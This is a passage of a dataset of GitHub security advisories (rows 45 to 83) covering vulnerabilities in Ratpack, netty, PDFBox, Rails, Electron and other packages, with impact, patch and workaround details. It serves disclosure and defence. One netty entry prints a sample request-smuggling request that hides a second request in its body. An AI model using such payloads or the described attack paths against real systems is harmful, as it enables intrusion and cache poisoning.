This can be used to perform redirect cache poisoning where an attacker can force a cached redirect to redirect to their site instead of the intended redirect location.

### Patches

As of Ratpack 1.9.0, two changes have been made that mitigate this vulnerability:

1. The default PublicAddress implementation no longer infers the address from the request context, instead relying on the configured bind host/port
2. Relative redirects issued by the application are no longer absolutized; they are passed through as-is

### Workarounds

In production, ensure that [ServerConfigBuilder::publicAddress](https://ratpack.io/manual/current/api/ratpack/server/ServerConfigBuilder.html#publicAddress-java.net.URI-) correctly configures the server.

### References
 - https://portswigger.net/web-security/web-cache-poisoning",maven
45,36737,io.ratpack:ratpack-core,GHSA-hc33-32vw-rpp9,CVE-2021-29485,https://github.com/advisories/GHSA-hc33-32vw-rpp9,critical,2021-07-01 17:01:16 UTC,Remote Code Execution Vulnerability in Session Storage,"### Impact

A malicious attacker can achieve Remote Code Execution (RCE) via a maliciously crafted Java deserialization gadget chain leveraged against the Ratpack session store.

If your application does not use Ratpack's session mechanism, it is not vulnerable.

### Details

Attackers with the ability to write to session data, can potentially craft payloads that deserialize unsafe objects, leading to the ability to remotely execute arbitrary code. 
This is known as an “[insecure deserialization](https://portswigger.net/web-security/deserialization)” vulnerability, or “gadget vulnerability”.

Ratpack allows session data to be stored server side in an external system such as a relational database, or client side via user cookies.
When using server side storage, the attacker would need to obtain the ability to write to the session data store.
When using client side storage, the attacker would need to obtain the secrets used to encrypt and/or sign the session data stored in user cookies.

Ratpack's session mechanism allows storing serialized objects, of arbitrary types. 
The type must be specified when writing the data and when reading, with data only deserialized when there is an exact type match.
However, in the process of deserializing an object of a known/trusted/deserialization-safe type, it may attempt to deserialize unsafe types.

By default Ratpack uses Java's built-in serialization mechanism, though other serialization providers can be used.
The exact types of payloads required to enable an exploit depend on the exact serialization mechanism used.

To mitigate this vulnerability, Ratpack now employs a “strict allow-list” when deserializing (and serializing) objects to session data. 
All concrete types of objects serialized must be explicitly declared as safe.
Some standard well known JDK types are registered by default.

Serialization is provided by implementations of [`SessionSerializer`](https://ratpack.io/manual/1.9.0/api/ratpack/session/SessionSerializer.html).
Its existing methods have been deprecated, and replaced with a [new methods](https://ratpack.io/manual/1.9.0/api/ratpack/session/SessionSerializer.html#deserialize(java.lang.Class,java.io.InputStream,ratpack.session.SessionTypeFilter)) that accept a [`SessionTypeFilter`](https://ratpack.io/manual/1.9.0/api/ratpack/session/SessionTypeFilter.html) that can be used to assert whether a type is allowed when serializing and deserializing.

The default serializer implementation has been updated to use this mechanism.
Any proprietary implementations should also be updated to consult the type filter _before_ serializing or deserializing data.
Warnings will be logged any time an implementation that does not implement the new methods is used.

Upon upgrading to Ratpack 1.9, users of the built-in serialization mechanism will need to change their application to declare all types currently being serialized as being safe. This can be done using the new [`SessionModule.allowTypes()`](https://ratpack.io/manual/1.9.0/api/ratpack/session/SessionModule.html#allowTypes(com.google.inject.Binder,java.lang.Class...)) method. Please see its documentation for details...))

### Patches

Ratpack 1.9.0 introduces a strict allow-list mechanism that mitigates this vulnerability when used.

### Workarounds

The simplest mitigation for users of earlier versions is to reduce the likelihood of attackers being able to write to the session data store. 

Alternatively or additionally, the allow-list mechanism could be manually back ported by providing an alternative implementation of `SessionSerializer` that uses an allow-list.

### References

 - https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
 - https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
",maven
46,22961,go-ethereum,GHSA-m6gx-rhvj-fh52,,https://github.com/advisories/GHSA-m6gx-rhvj-fh52,critical,2021-06-29 21:13:54 UTC,Denial of service in go-ethereum due to CVE-2020-28362,"### Impact
Versions of Geth built with Go `<1.15.5` or `<1.14.12` are most likely affected by a critical DoS-related security vulnerability. The golang team has registered the underlying flaw as ‘CVE-2020-28362’.

We recommend all users to rebuild (ideally `v1.9.24`) with Go `1.15.5` or `1.14.12`, to avoid node crashes. Alternatively, if you are running binaries distributed via one of our official channels, we’re going to release `v1.9.24` ourselves built with Go `1.15.5`.

### Patches
This is not an issue in go-ethereum, rebuilding an older version with Go `1.15.5` or `1.14.12` will suffice to address the vulnerability. 

### Workarounds
Rebuilding with Go `1.15.5` or `1.14.12` will suffice to address the vulnerability. 

### References
- https://blog.ethereum.org/2020/11/12/geth_security_release/
- https://groups.google.com/g/golang-announce/c/NpBGTTmKzpM

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [go-ethereum](https://github.com/ethereum/go-ethereum)
* Email us at [security@ethereum.org](mailto:security@ethereum.org)
",go
47,17765,normalize-url,GHSA-px4h-xg32-q955,CVE-2021-33502,https://github.com/advisories/GHSA-px4h-xg32-q955,high,2021-06-08 23:11:43 UTC,ReDoS in normalize-url,"The normalize-url package before 4.5.1, 5.x before 5.3.1, and 6.x before 6.0.1 for Node.js has a ReDoS (regular expression denial of service) issue because it has exponential performance for data: URLs.",npm
48,34041,org.elasticsearch:elasticsearch,GHSA-62ww-4p3p-7fhj,CVE-2021-22135,https://github.com/advisories/GHSA-62ww-4p3p-7fhj,moderate,2021-07-02 18:33:02 UTC,API information disclosure flaw in Elasticsearch,Elasticsearch versions before 7.11.2 and 6.8.15 contain a document disclosure flaw was found in the Elasticsearch suggester and profile API when Document and Field Level Security are enabled. The suggester and profile API are normally disabled for an index when document level security is enabled on the index. Certain queries are able to enable the profiler and suggester which could lead to disclosing the existence of documents and fields the attacker should not be able to view.,maven
49,16351,prismjs,GHSA-gj77-59wh-66hg,CVE-2021-32723,https://github.com/advisories/GHSA-gj77-59wh-66hg,high,2021-06-28 18:33:18 UTC,Regular Expression Denial of Service (ReDoS) in Prism,"Some languages before 1.24.0 are vulnerable to Regular Expression Denial of Service (ReDoS).

### Impact

When Prism is used to highlight untrusted (user-given) text, an attacker can craft a string that will take a very very long time to highlight. Do not use the following languages to highlight untrusted text.

- ASCIIDoc
- ERB

Other languages are __not__ affected and can be used to highlight untrusted text.

### Patches
This problem has been fixed in Prism v1.24.

### References

- PrismJS/prism#2774
- PrismJS/prism#2688
",npm
50,35084,com.jfinal:jfinal,GHSA-2c25-xfpq-8w9r,CVE-2021-33348,https://github.com/advisories/GHSA-2c25-xfpq-8w9r,moderate,2021-08-13 15:22:14 UTC,Cross-site scripting in jfinal,"An issue was discovered in JFinal framework v4.9.10 and below. The ""set"" method of the ""Controller"" class of jfinal framework is not strictly filtered, which will lead to XSS vulnerabilities in some cases.",maven
51,36131,org.owasp.esapi:esapi,GHSA-3gp6-hhfw-4gqx,CVE-2010-3300,https://github.com/advisories/GHSA-3gp6-hhfw-4gqx,moderate,2021-08-13 15:22:24 UTC,Padding oracle attacks,It was found that all OWASP ESAPI for Java up to version 2.0 RC2 are vulnerable to padding oracle attacks.,maven
52,19243,bindata,GHSA-hj56-84jw-67h6,CVE-2021-32823,https://github.com/advisories/GHSA-hj56-84jw-67h6,low,2021-06-23 23:42:04 UTC,Potential Denial-of-Service in bindata,"In the bindata RubyGem before version 2.4.10 there is a potential denial-of-service vulnerability. In affected versions it is very slow for certain classes in BinData to be created. For example BinData::Bit100000, BinData::Bit100001, BinData::Bit100002, BinData::Bit<N>. In combination with <user_input>.constantize there is a potential for a CPU-based DoS. In version 2.4.10 bindata improved the creation time of Bits and Integers.

",rubygems
53,35517,org.bouncycastle:bcprov-ext-jdk15on,GHSA-6xx3-rg99-gc3p,CVE-2020-15522,https://github.com/advisories/GHSA-6xx3-rg99-gc3p,moderate,2021-08-13 15:22:31 UTC,Timing based private key exposure in Bouncy Castle,"Bouncy Castle BC Java before 1.66, BC C# .NET before 1.8.7, BC-FJA before 1.0.2.1, BC before 1.66, BC-FNA before 1.0.1.1 have a timing issue within the EC math library that can expose information about the private key when an attacker is able to observe timing information for the generation of multiple deterministic ECDSA signatures.",maven
54,33935,org.eclipse.jetty:jetty-server,GHSA-m6cp-vxjx-65j6,CVE-2021-34428,https://github.com/advisories/GHSA-m6cp-vxjx-65j6,low,2021-06-23 20:23:04 UTC,SessionListener can prevent a session from being invalidated breaking logout,"### Impact
If an exception is thrown from the `SessionListener#sessionDestroyed()` method, then the session ID is not invalidated in the session ID manager.   On deployments with clustered sessions and multiple contexts this can result in a session not being invalidated.  This can result in an application used on a shared computer being left logged in.

There is no known path for an attacker to induce such an exception to be thrown, thus they must rely on an application to throw such an exception.    The OP has also identified that during the call to `sessionDestroyed`, the `getLastAccessedTime()` throws an `IllegalStateException`, which potentially contrary to the servlet spec, so applications calling this method may always throw and fail to log out.  If such an application was only tested on a non clustered test environment, then it may be deployed on a clustered environment with multiple contexts and fail to log out.

### Workarounds
The application should catch all Throwables within their `SessionListener#sessionDestroyed()` implementations.
",maven
55,30130,mpmath,GHSA-f865-m6cq-j9vx,CVE-2021-29063,https://github.com/advisories/GHSA-f865-m6cq-j9vx,high,2021-08-09 20:44:51 UTC,ReDOS in Mpmath,A Regular Expression Denial of Service (ReDOS) vulnerability was discovered in Mpmath v1.0.0 when the mpmathify function is called.,pip
56,18142,striptags,GHSA-qxg5-2qff-p49r,CVE-2021-32696,https://github.com/advisories/GHSA-qxg5-2qff-p49r,moderate,2021-06-18 19:31:35 UTC,Passing in a non-string 'html' argument can lead to unsanitized output,"A type-confusion vulnerability can cause `striptags` to concatenate unsanitized strings when an array-like object is passed in as the `html` parameter. This can be abused by an attacker who can control the shape of their input, e.g. if query parameters are passed directly into the function.

### Impact

XSS

### Patches

`3.2.0`

### Workarounds

Ensure that the `html` parameter is a string before calling the function.
",npm
57,29628,impacket,GHSA-mj63-64x7-57xf,CVE-2021-31800,https://github.com/advisories/GHSA-mj63-64x7-57xf,critical,2021-06-18 18:43:14 UTC,Path traversal in impacket,Multiple path traversal vulnerabilities exist in smbserver.py in Impacket before 0.9.23. An attacker that connects to a running smbserver instance can list and write to arbitrary files via ../ directory traversal. This could potentially be abused to achieve arbitrary code execution by replacing /etc/shadow or an SSH authorized key.,pip
58,24191,nomad,GHSA-vf6q-9f2f-mwhv,CVE-2021-32575,https://github.com/advisories/GHSA-vf6q-9f2f-mwhv,moderate,2021-06-24 20:28:21 UTC,Improper network isolation in Hashicorp Nomad,"HashiCorp Nomad and Nomad Enterprise up to version 1.0.4 bridge networking mode allows ARP spoofing from other bridged tasks on the same node. Fixed in 0.12.12, 1.0.5, and 1.1.0 RC1.",go
59,19842,urllib3,GHSA-wqvq-5m8c-6g24,CVE-2020-26137,https://github.com/advisories/GHSA-wqvq-5m8c-6g24,moderate,2021-06-18 18:46:43 UTC,CRLF injection,"urllib3 before 1.25.9 allows CRLF injection if the attacker controls the HTTP request method, as demonstrated by inserting CR and LF control characters in the first argument of putrequest(). NOTE: this is similar to CVE-2020-26116.",pip
60,20088,wagtail,GHSA-xfrw-hxr5-ghqf,CVE-2021-32681,https://github.com/advisories/GHSA-xfrw-hxr5-ghqf,moderate,2021-06-17 20:10:42 UTC,Cross-site Scripting in wagtail,"### Impact
When the `{% include_block %}` template tag is used to output the value of a plain-text StreamField block (`CharBlock`, `TextBlock` or a similar user-defined block derived from `FieldBlock`), and that block does not specify a template for rendering, the tag output is not properly escaped as HTML. This could allow users to insert arbitrary HTML or scripting. This vulnerability is only exploitable by users with the ability to author StreamField content (i.e. users with 'editor' access to the Wagtail admin).

### Patches
Patched versions have been released as Wagtail 2.11.8 (for the LTS 2.11 branch), Wagtail 2.12.5, and Wagtail 2.13.2 (for the current 2.13 branch).

Site implementors who wish to retain the existing behaviour of allowing editors to insert HTML content in these blocks (and are willing to accept the risk of untrusted editors inserting arbitrary code) may disable the escaping by surrounding the relevant `{% include_block %}` tag in `{% autoescape off %}...{% endautoescape %}`.

### Workarounds
Site implementors who are unable to upgrade to a current supported version should audit their use of `{% include_block %}` to ensure it is not used to output `CharBlock` / `TextBlock` values with no associated template. Note that this only applies where `{% include_block %}` is used directly on that block (uses of `include_block` on a block _containing_ a CharBlock / TextBlock, such as a StructBlock, are unaffected). In these cases, the tag can be replaced with Django's `{{ ... }}` syntax - e.g. `{% include_block my_title_block %}` becomes `{{ my_title_block }}`.

### Acknowledgements
Many thanks to Karen Tracey for reporting this issue.

### For more information
If you have any questions or comments about this advisory:

* Visit Wagtail's [support channels](https://docs.wagtail.io/en/stable/support.html)
* Email us at security@wagtail.io (if you wish to send encrypted email, the public key ID is `0x6ba1e1a86e0f8ce8`)
",pip
61,17153,nedb,GHSA-339j-hqgx-qrrx,CVE-2021-23395,https://github.com/advisories/GHSA-339j-hqgx-qrrx,high,2021-06-21 17:13:06 UTC,Prototype Pollution,This affects all versions of package nedb. The library could be tricked into adding or modifying properties of Object.prototype using a __proto__ or constructor.prototype payload.,npm
62,34495,net.minidev:json-smart,GHSA-v528-7hrm-frqp,CVE-2021-27568,https://github.com/advisories/GHSA-v528-7hrm-frqp,critical,2021-06-16 18:03:47 UTC,Improper Check for Unusual or Exceptional Conditions in json-smart,"An issue was discovered in netplex json-smart-v1 through 2015-10-23 and json-smart-v2 through 2.4. An exception is thrown from a function, but it is not caught, as demonstrated by NumberFormatException. When it is not caught, it may cause programs using the library to crash or expose sensitive information.",maven
63,34638,org.apache.pdfbox:pdfbox,GHSA-6vqp-h455-42mr,CVE-2021-27906,https://github.com/advisories/GHSA-6vqp-h455-42mr,moderate,2021-05-13 22:30:13 UTC,Uncontrolled Memory Allocation in Apache PDFBox,A carefully crafted PDF file can trigger an OutOfMemory-Exception while loading the file. This issue affects Apache PDFBox version 2.0.22 and prior 2.0.x versions.,maven
64,34638,org.apache.pdfbox:pdfbox,GHSA-2h3j-m7gr-25xj,CVE-2021-27807,https://github.com/advisories/GHSA-2h3j-m7gr-25xj,moderate,2021-06-16 17:56:46 UTC,Excessive Iteration Denial of Service in Apache PDFBox,A carefully crafted PDF file can trigger an infinite loop while loading the file. This issue affects Apache PDFBox version 2.0.22 and prior 2.0.x versions.,maven
65,34497,io.undertow:undertow-core,GHSA-g4cp-h53p-v3v8,CVE-2020-10705,https://github.com/advisories/GHSA-g4cp-h53p-v3v8,high,2021-04-30 17:28:42 UTC,Allocation of Resources Without Limits or Throttling in Undertow,"A flaw was discovered in Undertow in versions before Undertow 2.1.1.Final where certain requests to the ""Expect: 100-continue"" header may cause an out of memory error. This flaw may potentially lead to a denial of service.",maven
66,34497,io.undertow:undertow-core,GHSA-cccf-7xw3-p2vr,CVE-2020-10719,https://github.com/advisories/GHSA-cccf-7xw3-p2vr,moderate,2021-04-30 17:28:33 UTC,HTTP Request Smuggling in Undertow,"A flaw was found in Undertow in versions before 2.1.1.Final, regarding the processing of invalid HTTP requests with large chunk sizes. This flaw allows an attacker to take advantage of HTTP request smuggling.",maven
67,34497,io.undertow:undertow-core,GHSA-p9w3-gwc2-cr49,CVE-2020-10687,https://github.com/advisories/GHSA-p9w3-gwc2-cr49,moderate,2021-04-30 17:28:52 UTC,HTTP Request Smuggling in Undertow,"A flaw was discovered in all versions of Undertow before Undertow 2.2.0.Final, where HTTP request smuggling related to CVE-2017-2666 is possible against HTTP/1.x and HTTP/2 due to permitting invalid characters in an HTTP request. This flaw allows an attacker to poison a web-cache, perform an XSS attack, or obtain sensitive information from request other than their own.",maven
68,34999,org.apache.axis:axis,GHSA-h9gj-rqrw-x4fq,CVE-2019-0227,https://github.com/advisories/GHSA-h9gj-rqrw-x4fq,high,2019-05-14 04:02:24 UTC,Server Side Request Forgery in Apache Axis,"A Server Side Request Forgery (SSRF) vulnerability affected the Apache Axis 1.4 distribution that was last released in 2006. Security and bug commits commits continue in the projects Axis 1.x Subversion repository, legacy users are encouraged to build from source. The successor to Axis 1.x is Axis2, the latest version is 1.7.9 and is not vulnerable to this issue.",maven
69,16012,postcss,GHSA-hwj9-h5mp-3pm3,CVE-2021-23368,https://github.com/advisories/GHSA-hwj9-h5mp-3pm3,moderate,2021-05-10 15:29:24 UTC,Regular Expression Denial of Service in postcss,The npm package `postcss` from 7.0.0 and before versions 7.0.36 and 8.2.10 is vulnerable to Regular Expression Denial of Service (ReDoS) during source map parsing.,npm
70,35912,io.netty:netty-codec-http2,GHSA-f256-j965-7f32,CVE-2021-21409,https://github.com/advisories/GHSA-f256-j965-7f32,moderate,2021-03-30 15:10:38 UTC,Possible request smuggling in HTTP/2 due missing validation of content-length,"### Impact
The content-length header is not correctly validated if the request only use a single Http2HeaderFrame with the endStream set to to true. This could lead to request smuggling if the request is proxied to a remote peer and translated to HTTP/1.1

This is a followup of https://github.com/netty/netty/security/advisories/GHSA-wm47-8v5p-wjpj which did miss to fix this one case. 

### Patches
This was fixed as part of 4.1.61.Final

### Workarounds
Validation can be done by the user before proxy the request by validating the header.",maven
71,35912,io.netty:netty-codec-http2,GHSA-wm47-8v5p-wjpj,CVE-2021-21295,https://github.com/advisories/GHSA-wm47-8v5p-wjpj,moderate,2021-03-09 18:49:49 UTC,Possible request smuggling in HTTP/2 due missing validation,"### Impact
If a Content-Length header is present in the original HTTP/2 request, the field is not validated by `Http2MultiplexHandler` as it is propagated up.  This is fine as long as the request is not proxied through as HTTP/1.1.
If the request comes in as an HTTP/2 stream, gets converted into the HTTP/1.1 domain objects (`HttpRequest`, `HttpContent`, etc.) via `Http2StreamFrameToHttpObjectCodec `and then sent up to the child channel's pipeline and proxied through a remote peer as HTTP/1.1 this may result in request smuggling.  

In a proxy case, users  may assume the content-length is validated somehow, which is not the case.  If the request is forwarded to a backend channel that is a HTTP/1.1 connection, the Content-Length now has meaning and needs to be checked.

An attacker can smuggle requests inside the body as it gets downgraded from HTTP/2 to HTTP/1.1.   A sample attack request looks like:

```
POST / HTTP/2
:authority:: externaldomain.com
Content-Length: 4

asdfGET /evilRedirect HTTP/1.1
Host: internaldomain.com
```

Users are only affected if all of this is `true`:
 * `HTTP2MultiplexCodec` or `Http2FrameCodec` is used
 * `Http2StreamFrameToHttpObjectCodec` is used to convert to HTTP/1.1 objects
 * These  HTTP/1.1 objects are forwarded to another remote peer.
 

### Patches
This has been patched in 4.1.60.Final

### Workarounds
The user can do the validation by themselves by implementing a custom `ChannelInboundHandler` that is put in the `ChannelPipeline` behind `Http2StreamFrameToHttpObjectCodec`.

### References
Related change to workaround the problem: https://github.com/Netflix/zuul/pull/980 ",maven
72,34365,io.netty:netty-codec-http,GHSA-5mcr-gq6c-3hq2,CVE-2021-21290,https://github.com/advisories/GHSA-5mcr-gq6c-3hq2,moderate,2021-02-08 21:17:48 UTC,Local Information Disclosure Vulnerability in Netty on Unix-Like systems,"### Impact

When netty's multipart decoders are used local information disclosure can occur via the local system temporary directory if temporary storing uploads on the disk is enabled.

The CVSSv3.1 score of this vulnerability is calculated to be a [6.2/10](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N&version=3.1)

### Vulnerability Details

On unix-like systems, the temporary directory is shared between all user. As such, writing to this directory using APIs that do not explicitly set the file/directory permissions can lead to information disclosure. Of note, this does not impact modern MacOS Operating Systems.

The method `File.createTempFile` on unix-like systems creates a random file, but, by default will create this file with the permissions `-rw-r--r--`. Thus, if sensitive information is written to this file, other local users can read this information.

This is the case in netty's `AbstractDiskHttpData` is vulnerable.

https://github.com/netty/netty/blob/e5951d46fc89db507ba7d2968d2ede26378f0b04/codec-http/src/main/java/io/netty/handler/codec/http/multipart/AbstractDiskHttpData.java#L80-L101

`AbstractDiskHttpData` is used as a part of the `DefaultHttpDataFactory` class which is used by `HttpPostRequestDecoder` / `HttpPostMultiPartRequestDecoder`.

You may be affected by this vulnerability your project contains the following code patterns:

```java
channelPipeline.addLast(new HttpPostRequestDecoder(...));
```

```java
channelPipeline.addLast(new HttpPostMultiPartRequestDecoder(...));
```

### Patches

This has been patched in version `4.1.59.Final`.

### Workarounds

Specify your own `java.io.tmpdir` when you start the JVM or use `DefaultHttpDataFactory.setBaseDir(...)` to set the directory to something that is only readable by the current user.

### References

 - [CWE-378: Creation of Temporary File With Insecure Permissions](https://cwe.mitre.org/data/definitions/378.html)
 - [CWE-379: Creation of Temporary File in Directory with Insecure Permissions](https://cwe.mitre.org/data/definitions/379.html)

### Similar Vulnerabilities

Similar, but not the same.

 - JUnit 4 - https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp
 - Google Guava - https://github.com/google/guava/issues/4011
 - Apache Ant - https://nvd.nist.gov/vuln/detail/CVE-2020-1945
 - JetBrains Kotlin Compiler - https://nvd.nist.gov/vuln/detail/CVE-2020-15824

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [netty](https://github.com/netty/netty)
* Email us [here](mailto:netty-security@googlegroups.com)

### Original Report

> Hi Netty Security Team,
> 
> I've been working on some security research leveraging custom CodeQL queries to detect local information disclosure vulnerabilities in java applications. This was the result from running this query against the netty project:
> https://lgtm.com/query/7723301787255288599/
> 
> Netty contains three local information disclosure vulnerabilities, so far as I can tell.
> 
> One is here, where the private key for the certificate is written to a temporary file.
> 
> https://github.com/netty/netty/blob/e5951d46fc89db507ba7d2968d2ede26378f0b04/handler/src/main/java/io/netty/handler/ssl/util/SelfSignedCertificate.java#L316-L346
> 
> One is here, where the certificate is written to a temporary file.
> 
> https://github.com/netty/netty/blob/e5951d46fc89db507ba7d2968d2ede26378f0b04/handler/src/main/java/io/netty/handler/ssl/util/SelfSignedCertificate.java#L348-L371
> 
> The final one is here, where the 'AbstractDiskHttpData' creates a temporary file if the getBaseDirectory() method returns null. I believe that 'AbstractDiskHttpData' is used as a part of the file upload support? If this is the case, any files uploaded would be similarly vulnerable.
> 
> https://github.com/netty/netty/blob/e5951d46fc89db507ba7d2968d2ede26378f0b04/codec-http/src/main/java/io/netty/handler/codec/http/multipart/AbstractDiskHttpData.java#L91
> 
> All of these vulnerabilities exist because `File.createTempFile(String, String)` will create a temporary file in the system temporary directory if the 'java.io.tmpdir' system property is not explicitly set. It is my understanding that when java creates a file, by default, and using this method, the permissions on that file utilize the umask. In a majority of cases, this means that the file that java creates has the permissions: `-rw-r--r--`, thus, any other local user on that system can read the contents of that file.
> 
> Impacted OS:
> - Any OS where the system temporary directory is shared between multiple users. This is not the case for MacOS or Windows.
> 
> Mitigation.
> 
> Moving to the `Files` API instead will fix this vulnerability. 
> https://docs.oracle.com/javase/8/docs/api/java/nio/file/Files.html#createTempFile-java.nio.file.Path-java.lang.String-java.lang.String-java.nio.file.attribute.FileAttribute...-
> 
> This API will explicitly set the posix file permissions to something safe, by default.
> 
> I recently disclosed a similar vulnerability in JUnit 4:
> https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp
> 
> If you're also curious, this vulnerability in Jetty was also mine, also involving temporary directories, but is not the same vulnerability as in this case.
> https://github.com/eclipse/jetty.project/security/advisories/GHSA-g3wg-6mcf-8jj6
> 
> I would appreciate it if we could perform disclosure of this vulnerability leveraging the GitHub security advisories feature here. GitHub has a nice credit system that I appreciate, plus the disclosures, as you can see from the sampling above, end up looking very nice.
> https://github.com/netty/netty/security/advisories
> 
> This vulnerability disclosure follows Google's [90-day vulnerability disclosure policy](https://www.google.com/about/appsecurity/) (I'm not an employee of Google, I just like their policy). Full disclosure will occur either at the end of the 90-day deadline or whenever a patch is made widely available, whichever occurs first.
> 
> Cheers,
> Jonathan Leitschuh",maven
73,34638,org.apache.pdfbox:pdfbox,GHSA-7grw-6pjh-jpc9,CVE-2021-31812,https://github.com/advisories/GHSA-7grw-6pjh-jpc9,moderate,2021-06-15 15:54:29 UTC,Infinite Loop in Apache PDFBox,"In Apache PDFBox, a carefully crafted PDF file can trigger an infinite loop while loading the file. This issue affects Apache PDFBox version 2.0.23 and prior 2.0.x versions.",maven
74,34638,org.apache.pdfbox:pdfbox,GHSA-fg3j-q579-v8x4,CVE-2021-31811,https://github.com/advisories/GHSA-fg3j-q579-v8x4,moderate,2021-06-15 15:54:32 UTC,Uncontrolled memory consumption,"In Apache PDFBox, a carefully crafted PDF file can trigger an OutOfMemory-Exception while loading the file. This issue affects Apache PDFBox version 2.0.23 and prior 2.0.x versions.",maven
75,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-cjjf-94ff-43w7,CVE-2018-12022,https://github.com/advisories/GHSA-cjjf-94ff-43w7,high,2019-03-25 18:03:09 UTC,High severity vulnerability that affects com.fasterxml.jackson.core:jackson-databind,"An issue was discovered in FasterXML jackson-databind prior to 2.7.9.4, 2.8.11.2, and 2.9.6. When Default Typing is enabled (either globally or for a specific property), the service has the Jodd-db jar (for database access for the Jodd framework) in the classpath, and an attacker can provide an LDAP service to access, it is possible to make the service execute a malicious payload.",maven
76,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-645p-88qh-w398,CVE-2018-14718,https://github.com/advisories/GHSA-645p-88qh-w398,critical,2019-01-04 19:06:55 UTC,Arbitrary Code Execution in jackson-databind,FasterXML jackson-databind 2.x before 2.9.7 might allow remote attackers to execute arbitrary code by leveraging failure to block the slf4j-ext class from polymorphic deserialization.,maven
77,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-4gq5-ch57-c2mg,CVE-2018-14719,https://github.com/advisories/GHSA-4gq5-ch57-c2mg,critical,2019-01-04 19:09:49 UTC,Arbitrary Code Execution in jackson-databind,FasterXML jackson-databind 2.x before 2.9.7 might allow remote attackers to execute arbitrary code by leveraging failure to block the blaze-ds-opt and blaze-ds-core classes from polymorphic deserialization.,maven
78,18828,activerecord,GHSA-hqf9-rc9j-5fmj,CVE-2014-0080,https://github.com/advisories/GHSA-hqf9-rc9j-5fmj,moderate,2017-10-24 18:33:36 UTC,Moderate severity vulnerability that affects activerecord,"SQL injection vulnerability in activerecord/lib/active_record/connection_adapters/postgresql/cast.rb in Active Record in Ruby on Rails 4.0.x before 4.0.3, and 4.1.0.beta1, when PostgreSQL is used, allows remote attackers to execute ""add data"" SQL commands via vectors involving \ (backslash) characters that are not properly handled in operations on array columns.",rubygems
79,15554,OPCFoundation.NetStandard.Opc.Ua,GHSA-8336-mxp6-v5h9,CVE-2018-12087,https://github.com/advisories/GHSA-8336-mxp6-v5h9,moderate,2018-10-16 19:51:18 UTC,Moderate severity vulnerability that affects OPCFoundation.NetStandard.Opc.Ua,Failure to validate certificates in OPC Foundation UA Client Applications communicating without security allows attackers with control over a piece of network infrastructure to decrypt passwords.,nuget
80,30233,Zope2,GHSA-77hv-8796-8ccp,CVE-2012-5486,https://github.com/advisories/GHSA-77hv-8796-8ccp,moderate,2018-07-23 19:51:50 UTC,Moderate severity vulnerability that affects Plone and Zope2,"ZPublisher.HTTPRequest._scrubHeader in Zope 2 before 2.13.19, as used in Plone before 4.3 beta 1, allows remote attackers to inject arbitrary HTTP headers via a linefeed (LF) character.",pip
81,19060,actionview,GHSA-86g5-2wh3-gc9j,CVE-2019-5418,https://github.com/advisories/GHSA-86g5-2wh3-gc9j,high,2019-03-13 17:26:59 UTC,Path Traversal in Action View,"# File Content Disclosure in Action View

Impact 
------ 
There is a possible file content disclosure vulnerability in Action View. 
Specially crafted accept headers in combination with calls to `render file:` 
can cause arbitrary files on the target server to be rendered, disclosing the 
file contents. 

The impact is limited to calls to `render` which render file contents without 
a specified accept format.  Impacted code in a controller looks something like 
this: 

``` 
class UserController < ApplicationController 
  def index 
    render file: ""#{Rails.root}/some/file"" 
  end 
end 
``` 

Rendering templates as opposed to files is not impacted by this vulnerability. 

All users running an affected release should either upgrade or use one of the 
workarounds immediately. 

Releases 
-------- 
The 6.0.0.beta3, 5.2.2.1, 5.1.6.2, 5.0.7.2, and 4.2.11.1 releases are 
available at the normal locations. 

Workarounds 
----------- 
This vulnerability can be mitigated by specifying a format for file rendering, 
like this: 

``` 
class UserController < ApplicationController 
  def index 
    render file: ""#{Rails.root}/some/file"", formats: [:html] 
  end 
end 
``` 

In summary, impacted calls to `render` look like this: 

``` 
render file: ""#{Rails.root}/some/file"" 
``` 

The vulnerability can be mitigated by changing to this: 

``` 
render file: ""#{Rails.root}/some/file"", formats: [:html] 
``` 

Other calls to `render` are not impacted. 

Alternatively, the following monkey patch can be applied in an initializer: 

``` 
$ cat config/initializers/formats_filter.rb 
# frozen_string_literal: true 

ActionDispatch::Request.prepend(Module.new do 
  def formats 
    super().select do |format| 
      format.symbol || format.ref == ""*/*"" 
    end 
  end 
end) 
``` 

Credits 
------- 
Thanks to John Hawthorn <john@hawthorn.email> of GitHub ",rubygems
82,16343,electron,GHSA-8xwg-wv7v-4vqp,CVE-2018-1000136,https://github.com/advisories/GHSA-8xwg-wv7v-4vqp,high,2018-03-26 16:41:17 UTC,Electron Vulnerable to Code Execution by Re-Enabling Node.js Integration,"Versions of electron 
A vulnerability has been discovered which allows Node.js integration to be re-enabled in some Electron applications that disable it.

For the application to be impacted by this vulnerability it must meet all of these conditions

- Runs on Electron 1.7, 1.8, or a 2.0.0-beta
- Allows execution of arbitrary remote code
- Disables Node.js integration
- Does not explicitly declare webviewTag: false in its webPreferences
- Does not enable the nativeWindowOption option
- Does not intercept new-window events and manually override event.newGuest without using the supplied options tag


## Recommendation

Update to `electron` version 1.7.13, 1.8.4, or 2.0.0.beta.5 or later

If you are unable to update your Electron version can mitigate the vulnerability with the following code.

```
app.on('web-contents-created', (event, win) => {
  win.on('new-window', (event, newURL, frameName, disposition,
                        options, additionalFeatures) => {
    if (!options.webPreferences) options.webPreferences = {};
    options.webPreferences.nodeIntegration = false;
    options.webPreferences.nodeIntegrationInWorker = false;
    options.webPreferences.webviewTag = false;
    delete options.webPreferences.preload;
  })
})

// and *IF* you don't use WebViews at all,
// you might also want
app.on('web-contents-created', (event, win) => {
  win.on('will-attach-webview', (event, webPreferences, params) => {
    event.preventDefault();
  })
})
```",npm
83,18847,railties,GHSA-m42h-mh85-4qgc,CVE-2019-5420,https://github.com/advisories/GHSA-m42h-mh85-4qgc,critical,2019-03-13 17:28:35 UTC,Use of Insufficiently Random Values in railties,"# Possible Remote Code Execution Exploit in Rails Development Mode

Impact 
------ 
